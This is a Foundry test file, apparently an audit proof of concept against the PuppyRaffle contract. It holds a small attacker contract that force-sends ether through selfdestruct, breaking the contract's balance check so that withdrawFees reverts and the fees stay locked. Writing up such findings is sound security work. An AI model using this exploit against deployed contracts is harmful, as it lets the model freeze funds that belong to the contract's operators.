// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Audit_PoC_Selfdestruct is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }


    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanBreakWithdrawFees() public playersEntered {
        // DONE - 1. enterRaffle with entranceFee with the help of modifier playersEntered

        // DONE - 2. console.log(address(this).balance) before pushing through self-destruct
        console.log(address(puppyRaffle).balance, "= Balance of PuppyRaffle contract before attack");

        // DONE - 3. Create an attackerContract instance and load with funds
        selfDestruct attackerContract = new selfDestruct(puppyRaffle);
        vm.deal(address(attackerContract), 10 ether);
        console.log(address(attackerContract).balance, "= Balance of Attacker contract");
        
        // DONE - 4. Push funds through self-destruct to the address(PuppyRaffle)
        vm.prank(playerOne);
        attackerContract.destroy();

        // 5. Test selectWinner(), so that totalFees != 0
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        // DONE - 5. console.log(address(this).balance)
        console.log(address(puppyRaffle).balance, "= Balance of PuppyRaffle contract after attack");
        console.log(puppyRaffle.totalFees(), "= PuppyRaffle totalFees currently");
        
        // DONE - 6. create a check for the next call to revert  
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        vm.prank(playerOne);

        // DONE - 7. call puppyRaffle.withdrawFees()
        puppyRaffle.withdrawFees();
    } 
}

contract selfDestruct {
    
    PuppyRaffle puppyRaffle;
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function destroy() public {
        selfdestruct(payable(address(puppyRaffle)));
    }
}